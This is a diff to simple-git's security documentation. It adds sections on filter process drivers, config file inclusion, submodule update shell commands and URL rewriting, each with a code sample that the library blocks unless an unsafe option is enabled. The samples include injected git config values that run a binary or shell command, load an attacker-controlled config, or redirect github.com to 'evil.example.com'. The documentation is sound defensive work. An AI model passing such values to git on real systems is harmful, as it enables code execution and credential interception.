@@ -317,9 +317,10 @@ await simpleGit({ unsafe: { allowUnsafeDiffTextConv: true } })
 
 ### Filter operations
 
-The `filter.<driver>.clean` and `filter.<driver>.smudge` configuration values define binaries that transform
-file content when checking out (`smudge`) and staging (`clean`). Controlling either value allows an attacker
-to read or modify every file that passes through the filter.
+The `filter.<driver>.clean`, `filter.<driver>.smudge`, and `filter.<driver>.process` configuration values
+define binaries that transform file content when staging (`clean`), checking out (`smudge`), or via a
+persistent long-running process (`process`). Controlling any of these values allows an attacker to read or
+modify every file that passes through the filter.
 
 ```typescript
 import { simpleGit } from 'simple-git';
@@ -331,6 +332,10 @@ await simpleGit()
 // throws — smudge filter
 await simpleGit()
    .raw('-c', 'filter.lfs.smudge=malicious-binary', 'checkout', 'main');
+
+// throws — long-running process filter
+await simpleGit()
+   .raw('-c', 'filter.lfs.process=malicious-binary', 'checkout', 'main');
 
 // opt in to using custom filter binaries
 await simpleGit({ unsafe: { allowUnsafeFilter: true } })
@@ -449,4 +454,60 @@ await simpleGit({ unsafe: { allowUnsafeConfigEnvCount: true } })
       GIT_CONFIG_VALUE_0: 'ci-bot@example.com',
    })
    .commit('CI build commit');
+```
+
+### Config file inclusion
+
+The `include.path` configuration directive instructs `git` to load an additional configuration file and
+treat its contents as part of the current configuration. An attacker-controlled path can direct `git` to
+load a malicious config that overrides any setting, including those that enable further command-execution
+vectors such as `core.hooksPath` or `core.sshCommand`.
+
+```typescript
+import { simpleGit } from 'simple-git';
+
+// throws
+await simpleGit()
+   .raw('-c', 'include.path=/attacker/controlled/config', 'status');
+
+// opt in to loading external config files
+await simpleGit({ unsafe: { allowUnsafeInclude: true } })
+   .raw('-c', 'include.path=/shared/team.gitconfig', 'status');
+```
+
+### Submodule update strategy
+
+The `submodule.<name>.update` configuration controls how `git submodule update` refreshes each submodule.
+When the value is prefixed with `!`, git treats the remainder as a shell command and executes it directly,
+providing an arbitrary code-execution path that triggers on every submodule update.
+
+```typescript
+import { simpleGit } from 'simple-git';
+
+// throws — shell command as update strategy
+await simpleGit()
+   .raw('-c', 'submodule.evil.update=!malicious-binary', 'submodule', 'update');
+
+// opt in to using a custom submodule update strategy
+await simpleGit({ unsafe: { allowUnsafeSubmodule: true } })
+   .raw('-c', 'submodule.vendor.update=!custom-update-script', 'submodule', 'update');
+```
+
+### URL rewriting
+
+The `url.<base>.insteadOf` configuration silently rewrites any URL that begins with the given base before
+`git` makes a network connection. An attacker-controlled rewrite rule can redirect operations to an
+arbitrary host, intercepting credentials sent over the original transport or substituting malicious
+repository content.
+
+```typescript
+import { simpleGit } from 'simple-git';
+
+// throws — redirects github.com traffic to an attacker host
+await simpleGit()
+   .raw('-c', 'url.https://evil.example.com.insteadOf=https://github.com', 'clone', 'https://github.com/org/repo');
+
+// opt in to using URL rewriting
+await simpleGit({ unsafe: { allowUnsafeUrlRewrite: true } })
+   .raw('-c', 'url.git://internal.mirror.insteadOf=https://github.com', 'clone', 'https://github.com/org/repo');
 ```
